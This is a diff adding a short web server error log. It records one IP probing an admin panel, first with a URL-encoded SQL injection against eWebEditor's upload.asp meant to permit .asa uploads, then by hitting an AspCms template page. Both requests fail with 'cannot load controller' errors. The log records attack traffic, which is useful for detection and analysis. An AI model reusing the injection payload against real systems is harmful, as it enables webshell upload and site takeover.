@@ -1,0 +1,6 @@
+[ 2020-09-07T18:38:16+08:00 ] 112.114.106.176 /admin/ewebeditor/upload.asp?action=save&type=IMAGE&style=firefox%27%20union%20select%20S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt,%20[S_ImageExt]%2b%27|asa%27,S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl%20from%20ewebeditor_style%20where%20s_name=%27standard%27%20and%20%27a%27=%27a
+ERR: 无法加载控制器:Ewebeditor
+
+[ 2020-09-07T18:38:21+08:00 ] 112.114.106.176 /admin/_style/AspCms_TemplateAdd.asp?acttype=html&action=add
+ERR: 无法加载控制器:Style
+
